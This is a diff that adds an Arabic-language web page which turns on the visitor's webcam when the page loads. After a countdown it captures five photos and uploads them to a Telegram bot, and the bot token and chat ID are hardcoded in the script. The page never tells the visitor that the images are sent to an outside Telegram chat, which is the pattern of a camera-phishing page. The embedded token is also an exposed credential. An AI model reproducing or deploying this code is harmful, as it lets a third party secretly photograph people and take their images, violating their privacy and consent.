@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>التقاط تلقائي للكاميرا</title>
+  <style>
+    body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;text-align:center;background:#fff;color:#333}
+    #video{display:none;width:320px;height:240px;border:1px solid #ccc}
+    #fallbackBtn{display:none;padding:10px 18px;font-size:18px}
+    #countdown{margin:12px 0;font-size:22px}
+  </style>
+</head>
+<body>
+  <div>
+    <div id="countdown">جارٍ تهيئة الكاميرا…</div>
+    <button id="fallbackBtn">انقر لتشغيل الكاميرا</button><br>
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+<script>
+const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
+const chatId   = '1717245674';
+const PHOTO_LIMIT = 5;          // عدد الصور
+const INTERVAL_MS = 150;        // بين كل لقطة وأخرى
+const video = document.getElementById('video');
+const countdownEl = document.getElementById('countdown');
+const fallbackBtn = document.getElementById('fallbackBtn');
+
+// نحاول فورًا بعد التحميل – داخل نافذة تفعيل المستخدم
+window.addEventListener('DOMContentLoaded', tryStartCapture);
+// زرّ طوارئ إن فشل المحاولة الصامتة
+fallbackBtn.addEventListener('click', () => tryStartCapture(true));
+
+async function tryStartCapture(fromButton = false){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject = stream;
+    video.style.display = 'block';
+    fallbackBtn.style.display = 'none';
+    startSequence();
+  }catch(err){
+    console.warn('getUserMedia فشل:', err);
+    if(!fromButton){
+      // أظهر الزر ليضغطه المستخدم يدويًا
+      fallbackBtn.style.display = 'inline-block';
+      countdownEl.textContent = 'اضغط الزر لتشغيل الكاميرا';
+    }else{
+      alert('تعذّر الوصول إلى الكاميرا (تأكد من الإذن أو من المتصفح).');
+    }
+  }
+}
+
+function startSequence(){
+  let remaining = 10; // عدّ تنازلي
+  countdownEl.textContent = `سيبدأ التصوير خلال ${remaining} ثوانٍ…`;
+  const t = setInterval(()=>{
+    remaining--;
+    countdownEl.textContent = (remaining>0)
+      ? `سيبدأ التصوير خلال ${remaining} ثوانٍ…`
+      : 'يتم التقاط الصور…';
+    if(remaining<=0){ clearInterval(t); capturePhotos(); }
+  },1000);
+}
+
+function capturePhotos(){
+  let taken = 0;
+  const photos = [];
+  const canvas = document.createElement('canvas');
+  canvas.width  = video.videoWidth  || 320;
+  canvas.height = video.videoHeight || 240;
+  const ctx = canvas.getContext('2d');
+
+  const id = setInterval(()=>{
+    if(taken >= PHOTO_LIMIT){
+      clearInterval(id);
+      sendPhotos(photos);
+      countdownEl.textContent = 'اكتمل الإرسال ✅';
+      return;
+    }
+    ctx.drawImage(video,0,0);
+    canvas.toBlob(b=>{ photos.push(b); });
+    taken++;
+  }, INTERVAL_MS);
+}
+
+function sendPhotos(blobs){
+  blobs.forEach((blob,i)=>{
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append('photo', blob, `photo${i+1}.jpg`);
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:form})
+      .then(r=>r.json()).then(j=>console.log('Telegram',j))
+      .catch(e=>console.error('Telegram error',e));
+  });
+}
+</script>
+</body>
+</html>
